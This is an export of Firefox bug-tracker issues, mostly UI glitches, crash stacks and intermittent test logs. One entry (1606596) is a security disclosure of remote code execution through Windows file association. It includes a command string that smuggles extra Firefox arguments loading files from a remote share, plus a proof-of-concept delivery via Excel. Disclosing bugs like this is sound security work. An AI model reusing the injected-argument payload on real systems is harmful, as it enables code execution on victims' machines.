Issue id,Summary,Status,Priority,Resolution,Description
1606532,Address bar doesn't elide origins correctly,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: (1) Visit https://long-extended-subdomain-name-containing-many-letters-and-dashes.badssl.com/ Actual results: The URL bar shows the origin elided from the right: https://long-extended-subdomain-nam... We all know Firefox can resize and it will save position and will work on that position. If we set it to minimum size we can simply find the result. Expected results: The URL bar shows the origin elided from the left: ...many-letters-and-dashes.badssl.com/... The way Firefox android shows, you can check that."
1606566,"""TypeError: info.PDFFormatVersion is undefined"" when PDF header is invalid",VERIFIED,--,FIXED,"When the PDF version cannot be extracted from a PDF file, the PDF can still be displayed properly, but the console contains the following error: > TypeError: info.PDFFormatVersion is undefined As a result, such PDF files won't be recorded in telemetry. To reproduce, edit a PDF file and replace the `%PDF-x.x` part with whitespace. Then open that PDF file in Firefox (with MIME-type application/pdf; either from a server, or just from `file://` )."
1606572,no suggestions while typing in urlbar,RESOLVED,--,WORKSFORME,User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: typed something in urlbar Actual results: no suggestions displayed. Even search engines not shown. Absolutely nothing pops down Expected results: Suggestions related to typed query should show up
1606596,File association Remote Code Execution via command line parameter injection in Firefox,RESOLVED,--,FIXED,"Tested on Microsoft Windows 10 Enterprise version 10.0.17763 Build 17763 Using Firefox version 71.0 (32-bit) Steps to reproduce (local only): * Setup Firefox as Windows' default .pdf handler (right click a pdf file -> open with -> chose other -> select always open with Firefox) * Open the run prompt (windows key + r) and run the following URL: * \\\\poiu.xss.vg@ssl\a.txt"" -appomni appomni.pdf -greomni \share\greomni.pdf Steps to reproduce (via MS Excel): * Setup Firefox as Windows' default .pdf handler (right click a pdf file -> open with -> chose other -> select always open with Firefox) * visit https://poiu.xss.vg/oausdhvjzlxkcn/poc.html (this will open a CSV file in excel) * Click the link in the excel document. * Open the greomni.pdf file Expected Result: Firefox ignores the shell activation command as additional command line arguments are present. Actual Result: Firefox accepts the command and runs using the greomni and appomni files from the internet share. Detailed Information: This issue is very similar to bug 1530103 and bug 384384 except that it is by file type association as opposed to protocol association. In Windows, it is possible to inject arbitrary arguments when Fi"
1606602,login button on faq page is not working,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Firefox for Android Steps to reproduce: 1.login to snapdeal 2.opened past orders 3.went to help center and clicked on login button Actual results: button did not work(was not clickable) Expected results: login page should have popped"
1606605,dropdown list in search menu does not appear,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Firefox for Android Steps to reproduce: go to search bar enter the product to be found drop down list do not appear Actual results: drop down list not appeared Expected results: drop down list should appear"
1606620,right click context menu displaying in first screen while window in second screen,NEW,--,,User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: 1-Open Firefox in 2nd monitor display screen (external monitor). 2- Right click mouse while in 2nd monitor somewhere on a web page 3-displays context menu as usual 4-Right click mouse while still in 2nd monitor somewhere on same web page 5-displays context menu in first monitor display screen (laptop). Actual results: Displays context menu in first monitor display screen (laptop). image attached Expected results: 1- Right click mouse while in 2nd monitor somewhere on a web page 2-displays context menu as usual in mouse pointer same place
1606631,"Inefficient z-ordering of elements in the browser UI, causes large layers with current WebRender heuristics",RESOLVED,P3,INCOMPLETE,"Steps to reproduce: 1. Be on macOS. 2. Enable the prefs `gfx.webrender.all`, `gfx.webrender.compositor` (requires restart), and `gfx.core-animation.tint-opaque` (restartless). 3. Pay attention to the amount of redness on the screen. Expected results: The active tab and the back button should be drawn into the same red layer as the rest of the chrome. Actual results: The active tab and the back button are drawn into another red layer that goes on top of the rest of the chrome. When the statusbar appears (when a link is moused over), there's a big red layer that covers the majority of the browser window. Most of the browser chrome is ""behind"" the content area, in z-order. Elements that are ""in front"" of the content area, in z-order, go into a separate layer. (The fact that these elements don't overlap the content area is not taken into account by WebRender, and we should keep it that way.) We should apply some z-index declarations in browser CSS, so that we have the following order: 1. Bottom layer: The window background and all elements in the browser chrome that do not overlap the content area. This should include the active tab and the back button. 2. Middle layer: The `<browser>`"
1606644,pages with unsaved data should not be closed by middle click on their tab,NEW,P5,,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: I am using Linux 1. Type some text into a page text box. 2. Click once on the page tab. A dialog box appears ""This page is asking you to confirm that you want to leave - data you have entered may not be saved."". 3. Click once more on the tab and the page closes. Actual results: On the second click, the page closed ignoring the apparently blocking dialog and loosing the information I typed into the text box. For my particular use cases, I use middle click to remove a collection of consecutive unused pages. To do this, I rapidly middle click on the tabs. With the current behavior, I close pages that have un-sumitted text. Expected results: Middle clicking on a tab that has a dialog box ""This page is asking you to confirm that you want to leave - data you have entered may not be saved."" should do nothing."
1606648,Intermittent browser/components/enterprisepolicies/tests/browser/browser_policy_websitefilter.js | Uncaught exception - Page http://mochi.test:8888/browser/browser/components/enterprisepolicies/tests/browser/policy_websitefilter_block.html block was corre,RESOLVED,P5,INCOMPLETE,"**Filed by:** nbeleuzu [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=283202187&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/To6731EGSRGapPIKhGy0Mg/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-02T14:00:26.092Z] 14:00:26 INFO - TEST-PASS | browser/components/enterprisepolicies/tests/browser/browser_policy_websitefilter.js | Sanity check the temporary file doesn't exist. - true == true - [task 2020-01-02T14:00:26.092Z] 14:00:26 INFO - Buffered messages finished [task 2020-01-02T14:00:26.097Z] 14:00:26 INFO - TEST-UNEXPECTED-FAIL | browser/components/enterprisepolicies/tests/browser/browser_policy_websitefilter.js | Uncaught exception - Page http://mochi.test:8888/browser/browser/components/enterprisepolicies/tests/browser/policy_websitefilter_block.html block was correct (expected=true). - threw exception: [Exception... ""(null)"" nsresult: ""0x80040111 (NS_ERROR_NOT_AVAILABLE)"" location: ""<unknown>"" data: no] [task 2020-01-02T14:00:26.097Z] 14:00:26 INFO - Leaving test bound test [task 2020-01-02T14:00:26.098Z] 14:00:26 INFO - GECKO(4412) | [Child 5133, Main Thread] WARNING: '!tsi', f"
1606677,Dragging a folder shortcut on the toolbar duplicates the shortcut,NEW,P3,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I had sync on, so my mobile bookmarks synced into PC firefox. The mobile bookmarks is listed under ""other bookmarks"" in the PC. So i dragged and moved it into the ""bookmark toolbar"" to re-arrange the bookmarks. But i had too many bookmarks in the toolbar, so some are truncated (inside the arrow). I dragged the folder from arrow subsection to toolbar again to bring it in front, and send other bookmark (whichever bookmark in last, before arrow) into that section (truncated section). But instead of putting the mobile bookmark folder in the toolbar front, the folder got replicated. Actual results: The bookmark folder got replicated instead of getting moved (re-arranged). Expected results: The bookmark folder should have re-arranged."
1606731,Searching for a page in the address bar or history sidebar should ignore diacritics,RESOLVED,P3,FIXED,"Steps to reproduce: 1. Visit https://ca.wikipedia.org/ 2. Type ""viquipedia"" in the address bar Expected results: https://ca.wikipedia.org/ should appear Actual results: https://ca.wikipedia.org/ does not appear"
1606777,Twitter scrolling and page movement lags and performance is impacted,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Open and log-in to Twitter 2. Scroll the timeline, hover over profiles, click through to tweet-threads, etc. Additional information: OS: macOS 10.15.2 Catalina Processor: 2.6 GHz 6-Core Intel Core i7 16GB memory I've included a memory report just in case as well. I have tried it on a fresh profile as well, though not in a nightly build, only the beta. Actual results: FPS drops occur, the page is overall laggy, and CPU usage spikes. Expected results: Twitter should be responsive and fast as it is on Chromium-based browsers and Webkit Safari."
1606789,"First run page suggests signing in when you already are, and accounts.firefox.com doesn't indicate you already are logged in",RESOLVED,P2,MOVED,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: 1. I reinstalled Firefox because it crashed every time I tried to open it 2. Firefox asked me to have a ""fresh start"" so I clicked it 3. Firefox asked me to login to Firefox so I clicked it 4. Then I added Lastpass to Firefox because I didn't know the password to my Firefox account 5. Lastpass didin't seem to wok so I closed Firefox 6. And was loged in when I started Firefox again Expected results: I expected to not be loged in after restart of Firefox. Maybe this has something to do with the old data after reinstalling Firefox?"
1606797,"Do not allow more than one simultaneous ""open external protocol"" dialog to appear per originating tab",RESOLVED,P3,FIXED,"**Affected versions** - Firefox 68.4.0esr - Firefox 70.0.1 - Firefox 72.0b11 - Firefox 73.0a1 **Affected platforms** - Windows 10 & 7 - macOS 10.15 **Steps to reproduce** 1. Open the following [link](https://outlook.live.com/people/0/) and login with valid credentials 2. If not available, create a new contact and add a phone number to it 3. On the newly created contact, click on the phone number **Expected result** - An external application window requesting the user to choose is shown **Actual result** - Two windows will appear, requesting the same action **Regression range** - I will see for a regression, if there is one. **Additional notes** - The actual issue can be seen in the attachment. - On Ubuntu 18, a request to launch an external application will not appear, instead a page stating that ""The address was not understood"" will appear."
1606809,"Right-clicking on edges of the expanded MegaBar gets the toolbar contextual menu, not the address bar one",VERIFIED,P1,FIXED,"STR 1. Turn on the bookmarks toolbar. 2. Click on the address bar to focus it and cause it to expand. 3. Decide you're going to paste something, but in the meantime you've moved the mouse down slightly but not off the expanded bar. 4. Right-click and go to select paste. Actual Results The toolbar bar context menu was shown and the bookmarks toolbar got disabled (because I did it too quick to realise). Expected Results The address bar context menu should have been shown and paste should have been selected. This also occurs on the top and side edges."
1606814,Perma Beta TEST-UNEXPECTED-FAIL |browser_urlbar_top_sites.js | The number of results should be the same as the number of Top Sites (6). - 1 == 6 - JS frame :: <...>browser_urlbar_top_sites.js :: topSitesShown when Gecko 73 merges to Beta on 2020-01-06,RESOLVED,--,DUPLICATE,Central as Beta simulation: https://treeherder.mozilla.org/#/jobs?repo=try&selectedJob=283326742&resultStatus=testfailed%2Cbusted%2Cexception%2Crunnable&revision=a8c659ef30c21235cb849dfd48366cac69c23024&searchStr=%28bc Failure log: https://treeherder.mozilla.org/logviewer.html#/jobs?job_id=283326742&repo=try&lineNumber=3238 [task 2020-01-03T11:46:37.027Z] 11:46:37 INFO - TEST-START | browser/components/urlbar/tests/browser/browser_urlbar_top_sites.js [task 2020-01-03T11:46:37.562Z] 11:46:37 INFO - TEST-INFO | started process screentopng [task 2020-01-03T11:46:38.111Z] 11:46:38 INFO - TEST-INFO | screentopng: exit 0 [task 2020-01-03T11:46:38.112Z] 11:46:38 INFO - Buffered messages logged at 11:46:37 [task 2020-01-03T11:46:38.113Z] 11:46:38 INFO - Entering test bound init [task 2020-01-03T11:46:38.113Z] 11:46:38 INFO - Leaving test bound init [task 2020-01-03T11:46:38.114Z] 11:46:38 INFO - Entering test bound topSitesShown [task 2020-01-03T11:46:38.114Z] 11:46:38 INFO - TEST-PASS | browser/components/urlbar/tests/browser/browser_urlbar_top_sites.js | The test suite browser should have 6 Top Sites. - 6 == 6 - [task 2020-01-03T11:46:38.114Z] 11:46:38 INFO - TEST-PASS | browser/componen
1606819,Opening folder from bookmark bar closes two of four bookmarks,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: I have on my bookmark bar a folder, with 4 items in it. i open this folder and select 'Open all in tabs' https://community.ui.com/tags/unifi-wireless https://community.ui.com/tags/beta:unifi-wireless https://community.ui.com/tags/unifi-routing-switching https://community.ui.com/tags/beta:unifi-routing-switching Actual results: 4 tabs are opened, and then one/two of them are closed again before loading finishes or even before I've had a chance to look at them. Expected results: 4 tabs should remain open."
1606893,"JavaScript error: resource://gre/modules/PushDB.jsm, line 414: Error: Record ? does not exist",RESOLVED,P3,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: - Re-install Firefox Nightly - Configure Sync - See Errors ``` JavaScript error: resource://gre/modules/PushDB.jsm, line 414: Error: Record 0fc4cbcc-cb21-4f8b-b19a-da3bce18b8d7 does not exist ``` Actual results: Errors: ``` 1578068234448 Sync.AddonsReconciler INFO Registering as Add-on Manager listener. 1578068234448 Sync.AddonsReconciler DEBUG Adding change listener. 1578068234450 FirefoxAccounts TRACE not checking freshness of profile as it remains recent JavaScript error: resource://gre/modules/PushDB.jsm, line 414: Error: Record 0fc4cbcc-cb21-4f8b-b19a-da3bce18b8d7 does not exist JavaScript error: resource://gre/modules/PushDB.jsm, line 414: Error: Record 0fc4cbcc-cb21-4f8b-b19a-da3bce18b8d7 does not exist {} 1578068239451 Sync.Service DEBUG User-Agent: Firefox/73.0a1 (Linux x86_64) FxSync/1.75.0.20191217161753.desktop 1578068239451 Sync.Service INFO Starting sync at 2020-01-03 13:17:19 in browser session 06Tm6orSJVql 1578068239451 Sync.Service DEBUG In sync: should login. 1578068239452 Sync.Service INFO User logged in successfully - verifying login. ``` Expected results: No err"
1606905,Downloads hang in Firefox,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Go to a Google Drive link on the internet Download five or six large files over 5 GB Actual results: After some minutes, most of the downloads hang. There is absolutely zero progress despite the fact that they all say ≈800 kb a second. These downloads will hang for eternity until you pause them. When you resume download, they always instantly fail. Upon hitting the little curved arrow retry button, the downloads will continue but they will always hang with no progress yet again after a few minutes. Repeat, repeat, repeat, to infinity and beyond. Expected results: The downloads should not hang nor should they fail, especially when there is nothing wrong with my internet and browsing is unaffected"
1606934,Intermittent browser/base/content/test/zoom/browser_default_zoom_fission.js | Test timed out -,RESOLVED,P5,WORKSFORME,**Filed by:** rmaries [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=283392478&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/V1Za79MeSYqWM0hIXNpmRA/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-03T20:30:39.612Z] 20:30:39 INFO - TEST-START | browser/base/content/test/zoom/browser_default_zoom_fission.js [task 2020-01-03T20:30:39.613Z] 20:30:39 INFO - GECKO(1970) | console.log: Creating tab [task 2020-01-03T20:30:39.653Z] 20:30:39 INFO - GECKO(1970) | console.log: Loading tab [task 2020-01-03T20:30:40.153Z] 20:30:40 INFO - GECKO(1970) | console.log: Changing default zoom [task 2020-01-03T20:30:40.368Z] 20:30:40 INFO - GECKO(1970) | console.log: Current zoom is: 0.67 [task 2020-01-03T20:30:40.368Z] 20:30:40 INFO - GECKO(1970) | console.log: Spawinging iframe [task 2020-01-03T20:30:40.368Z] 20:30:40 INFO - GECKO(1970) | console.log: Awaiting frame promise [task 2020-01-03T20:30:40.687Z] 20:30:40 INFO - GECKO(1970) | console.log: Removing tab [task 2020-01-03T20:30:40.687Z] 20:30:40 INFO - GECKO(1970) | console.log: Adding tab [task 2020-01-03T20:30:40.740Z] 20:30:40 INFO - GECKO(1970) |
1606980,bookmarks are disabbled,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Since the installation from the last version (71.0) of FireFox at the beginning of december 2019. Actual results: My bookmarks, an directorys of bookmarks, are empty. And if I want to restaur one of the proposed folder from my precedent bookmarks, via Firefox, Firefox indicate that he can't treat this folder ; the Firefox bookmarks folder... Expected results: To list all my bookmarks folders and directorys"
1607016,Cannot select existing tags when saving to pocket list,RESOLVED,P2,WONTFIX,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Click ""Save to Pocket"" arrow icon in address bar. Enter text in field ""Add tags"". Actual results: I can type in a new tag normally....however....what if the tag already exists? Expected results: In previous versions of Firefox, when entering text in field, the application would locate previously created tags and allow you to select the tag (thereby avoiding duplicate tag creation). This function is no longer working. When i type in a tag name, Firefox no longer presents a list possible matches from existing tags"
1607017,Nightly 72.0a1 to 73.0a1 update doorhanger loop despite fresh download,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Been using Nightly for some years now, and managed to resolve most issues (minor or significant) through switching to a new profile and/or downloading a fresh copy of Nightly. I've missed almost 2 weeks of updates due to the holiday period Firefox channel: Nightly Firefox version: 73.0a1 Firefox Build ID: 20200102094341 Environment: Arch Linux Hardened (5.3.15.a-1-hardened) Desktop: Gnome 3.34.2 Menu >> (Top status message: ""Download a fresh copy of Nightly"") 1. Navigate to https://www.mozilla.org/firefox/channel/desktop/ 2. Select Download for the Nightly version 3. Expand download local tar.bz2 file using Archive Manager [I perform this inside the ""Downloads"" directory] 4. Delete legacy ""Firefox"" directory [in my case this is held inside my Documents directory] 5. Rename fresh Nightly ""Firefox"" directory to ""firefox-nightly"" 6. Move directory from Downloads to Documents 7. Desktop file and hidden directories like "".mozilla"" remain as before Actual results: If I simply restart Nightly, it continues to show this version needs updating. If I navigate to a new webpage the Restart spla"
1607022,Extension recommendation on YouTube despite the fact that I disabled these recommendations,VERIFIED,P1,FIXED,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Extension recommendations appear sometimes (once a day?) on YouTube despite the fact that I disabled these recommendations. Actual results: I saw extension recommendation. Expected results: There have to be no extension recommendations.
1607028,tab-crash page needs Submit button or label,UNCONFIRMED,P5,,"In Firefox 71.0, I visited a certain Web page. In a few seconds, the page crashed the tab, although not the whole browser. The tab replaced the downloaded page with a page saying, near the top, ""Gah. Your tab just crashed.""/""We can help!"" and titled (in the tab and the tab's tooltip) ""Tab crash reporter"". I wanted to report the crash. The only two buttons FF offered said ""Restore This Tab"" and ""Close Tab"". It's not clear which button reports the crash; both are plausible. While ""Send an automated crash report so we can fix issues like this."" when checkmarked (which it is by default) would seem to mean that either button would send the report, because it says ""automated"" whereas clicking the button implies manually rather than automatically, it seems that the checkmark applies only to future crashes. I clicked to restore, which did not confirm a submission or its receipt, so I still don't know if Mozilla got the report. (I suppose I could have revisited the page, gotten another crash, and then clicked the other button and then I could assume that Mozilla got the report one way or the other, but the reason for a crash may lead us to hesitate to visit a page too often given a risk, e."
1607066,AdblockPlus plugin blocks some webpages to work correctly,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Testing environment: Windows7 SP1 on desktop computer, Firefox 71.0 (64bit), AdblockPlus plugin installed (https://adblockplus.org/, version 3.7) and active. 1. Go to webpage www.idnes.cz and choose article to read. Most articles contains image gallery, which can be opened by clicking to images in the article - try to open the galerry. Here are some links for testing: * https://www.idnes.cz/zpravy/domaci/jiri-matej-bruna-vysokoskolak-sest-titulu-rozhovor.A191217_161640_domaci_brzy/foto * https://www.idnes.cz/revue/spolecnost/victoria-beckhamova-navrharka-velka-britanie-vzhled-sebevedomi.A200103_122502_lidicky_bib/foto * https://www.idnes.cz/premium/sluzby/atlas-mraku-film-zdarma-online.A191230_151519_premium-sluzby_bhar/foto * https://www.idnes.cz/cestovani/po-cesku/zanikle-trate-27-kadansky-rohozec-doupov-zeleznice-trat.A200103_123524_po-cesku_vrja/foto/VRJ807780_53stkuxx_18.10.2019_fotopetrovsenk.jpg Actual results: When Adblockplus plugin is active, gallery does not show. Screen show loading icon, but images do not show. Clicking Previous (<) and Next (>) buttons has no "
1607073,Pictures have red tint due to Canvas Defender add-on,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Sometimes pictures on websites have a red tint (most times this is an issue with pictures uploaded by myself). This time it's visible on this page: https://displate.com/displate/1213267 Actual results: Interestingly during page load all pictures can be seen in their true, untinted color. After a short period it then gets tinted red. (See attached screenshot)"
1607086,enterprise policy forces privacy.resistFingerprinting to true,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: Launch Firefox with and without a policies.json, check the user agent it reports back. Actual results: Without the enterprise policy I get ""Mozilla/5.0 (X11; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"", with it I get ""Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"". Expected results: The correct user agent (Linux 71.0) should be reported even when enterprise policies are enabled."
1607106,Intermittent browser/components/newtab/test/browser/browser_discovery_styles.js | A promise chain failed to handle a rejection: A mutation operation in the transaction failed because a constraint was not satisfied. - stack: _requestWrapper@resource:,RESOLVED,P5,INCOMPLETE,"**Filed by:** ccoroiu [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=283539713&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/f1SeULN8QHmqas71Fcd8mg/runs/0/artifacts/public/logs/live_backing.log --- task 2020-01-05T22:56:04.136Z] 22:56:04 INFO - TEST-PASS | browser/components/newtab/test/browser/browser_discovery_styles.js | applied and normalized font weight - ""400"" == ""400"" - [task 2020-01-05T22:56:04.136Z] 22:56:04 INFO - Buffered messages finished [task 2020-01-05T22:56:04.136Z] 22:56:04 INFO - TEST-UNEXPECTED-FAIL | browser/components/newtab/test/browser/browser_discovery_styles.js | A promise chain failed to handle a rejection: A mutation operation in the transaction failed because a constraint was not satisfied. - stack: _requestWrapper@resource://activity-stream/lib/ActivityStreamStorage.jsm:118:3 [task 2020-01-05T22:56:04.136Z] 22:56:04 INFO - async*_set@resource://activity-stream/lib/ActivityStreamStorage.jsm:65:17 [task 2020-01-05T22:56:04.136Z] 22:56:04 INFO - _addImpressionForItem@resource://activity-stream/lib/ASRouter.jsm:1425:21 [task 2020-01-05T22:56:04.137Z] 22:56:04 INFO - ad"
1607144,Wrong numbering of ol with nested ul.,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (X11; FreeBSD amd64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I Have a ordered list containing more unordered lists seperated be on li of the orderlist. After each ul the next li in the ordered list hast the number of the next element in the embedded ul not the next number of the ol Actual results: test1 test1 test2 test3 test2 test1 test2 test3 test1 test2 test3 test4 Expected results: test1 test1 test2 test3 test2 test1 test2 test3 test1 test2 test3 test4
1607159,Crash in [@ mozilla::ipc::IProtocol::ChannelSend] called from Document::GetFailedCertSecurityInfo,VERIFIED,P1,FIXED,"This bug is for crash report bp-e7a94e34-28c0-4ecf-8b4b-ff1410200105. ``` Top 10 frames of crashing thread: 0 xul.dll mozilla::ipc::IProtocol::ChannelSend ipc/glue/ProtocolUtils.cpp:487 1 xul.dll mozilla::dom::PContentChild::SendIsSecureURI ipc/ipdl/PContentChild.cpp:2372 2 xul.dll mozilla::dom::Document::GetFailedCertSecurityInfo dom/base/Document.cpp:1804 3 xul.dll mozilla::dom::Document_Binding::getFailedCertSecurityInfo dom/bindings/DocumentBinding.cpp:5635 4 xul.dll mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions> dom/bindings/BindingUtils.cpp:3151 5 xul.dll js::InternalCallOrConstruct js/src/vm/Interpreter.cpp:544 6 xul.dll Interpret js/src/vm/Interpreter.cpp:3038 7 xul.dll js::RunScript js/src/vm/Interpreter.cpp:424 8 xul.dll js::InternalCallOrConstruct js/src/vm/Interpreter.cpp:580 9 xul.dll js::jit::DoCallFallback js/src/jit/BaselineIC.cpp:2905 ``` This is not a new crash, it seems to have started in version 69.0. It seems to involve `failedCertChain` so maybe it's related to bug 1555438? Just a guess, I don't know this code very well. It's happening mostly on Windows but there's Linu"
1607160,Maximizing window after bookmarking causes address bar to consume toolbar and trigger overflow,VERIFIED,P1,FIXED,"STR: 1. Click the bookmark star button. 2. With the bookmark panel still open, maximize the window. The address bar fills the toolbar and the toolbar items overflow. Happens when the window is resized during the bookmarking animation which starts immediately after the bookmark panel being closed. The library icon may also float in an odd location until the bookmarking animation is finished. After animation completes the address bar can be corrected by re-maximizing or resizing the window larger than the original size when the problem occurred. Regression range: https://hg.mozilla.org/integration/autoland/pushloghtml?fromchange=ac5fc1e491a2bb5481d47247bea3c2b22318001c&tochange=517c9efa9592ad0c103ec2542e4bc7fcaf06c505 Regressed by Bug 1580538."
1607177,"Intermittent ABORT: file z:/build/build/src/ipc/chromium/src/base/message_pump_win.cc, line 404 after ASSERTION: Wrong event target!: 'this == fl->GetBrowserChildMessageManager()', file dom/base/InProcessBrowserChildMessageManager.cpp, line 260",RESOLVED,P5,INCOMPLETE,"**Filed by:** rmaries [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=283588680&repo=try **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/AVMwkxuOTAKEEDy7kYZZsA/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-06T10:51:48.716Z] 10:51:48 INFO - TEST-START | browser/base/content/test/tabcrashed/browser_autoSubmitRequest.js [task 2020-01-06T10:52:13.051Z] 10:52:13 INFO - GECKO(2748) | [Parent 7648: Main Thread]: I/DocShellAndDOMWindowLeak ++DOMWINDOW == 21 (0000022678B452E0) [pid = 7648] [serial = 21] [outer = 0000000000000000] [task 2020-01-06T10:52:13.051Z] 10:52:13 INFO - GECKO(2748) | [Parent 7648: Main Thread]: I/DocShellAndDOMWindowLeak ++DOMWINDOW == 22 (00000226703CF800) [pid = 7648] [serial = 22] [outer = 0000022678B452E0] [task 2020-01-06T10:52:13.051Z] 10:52:13 INFO - GECKO(2748) | [Parent 7648, Gecko_IOThread] ###!!! ABORT: file z:/build/build/src/ipc/chromium/src/base/message_pump_win.cc, line 404 [task 2020-01-06T10:52:13.051Z] 10:52:13 INFO - GECKO(2748) | [Parent 7648: Main Thread]: I/DocShellAndDOMWindowLeak ++DOMWINDOW == 23 (00000226704D9C00) [pid = 7648] [serial = 23] [outer = 000002267"
1607185,"The card context menus from the ""Recommended by Pocket"" and ""Highlights"" sections are not fully visible if the browser is horizontally resized",NEW,P3,,"**[Affected versions]:** - Firefox Nightly 73.0a1 - Build ID: 20200106092427 **[Affected Platforms]:** - Windows 10 x64 - Mac 10.15.2 - Ubuntu 18.04 x64 **[Prerequisites]:** - Have a Firefox profile with the ""browser.search.region"" pref set to ""US"" in the ""about:config"" page. **[Steps to reproduce]:** 1. Open the browser with the profile from prerequisites. 2. Open a new tab and hover the ""Recommended by Pocket"" card displayed in the third position. 3. Click the menu button displayed in the top-right part of the card. 4. Resize the browser horizontally to 75% and observe the displayed context menu. **[Expected result]:** - All the context menu elements are correctly displayed and fully visible. **[Actual result]:** - The context menu is not fully visible. **[Notes]:** - This issue is reproducible with any card from the ""Recommended by Pocket"" section. - This issue is also reproducible with the card context menus from the ""Highlights"" section. - Attached a screen recording of the issue."
1607196,Intermittent browser/components/customizableui/test/browser_976792_insertNodeInWindow.js (finished) | application terminated with exit code 2,RESOLVED,P5,DUPLICATE,**Filed by:** aciure [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=283606648&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/ekJCs_QHRfuaQt5CwZK1yw/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-06T12:54:20.688Z] 12:54:20 ERROR - TEST-UNEXPECTED-FAIL | browser/components/customizableui/test/browser_976792_insertNodeInWindow.js (finished) | application terminated with exit code 2 [task 2020-01-06T12:54:20.696Z] 12:54:20 INFO - runtests.py | Application ran for: 0:00:48.156984 [task 2020-01-06T12:54:20.696Z] 12:54:20 INFO - zombiecheck | Reading PID log: /var/folders/bh/_s4j014n60d2hmv6h31c6gd8000017/T/tmpawvPHnpidlog [task 2020-01-06T12:54:20.696Z] 12:54:20 INFO - ==> process 2412 launched child process 2413 [task 2020-01-06T12:54:20.696Z] 12:54:20 INFO - ==> process 2412 launched child process 2414 [task 2020-01-06T12:54:20.696Z] 12:54:20 INFO - ==> process 2412 launched child process 2415 [task 2020-01-06T12:54:20.696Z] 12:54:20 INFO - ==> process 2412 launched child process 2416 [task 2020-01-06T12:54:20.696Z] 12:54:20 INFO - ==> process 2412 launched child process 2417 [task 2020-0
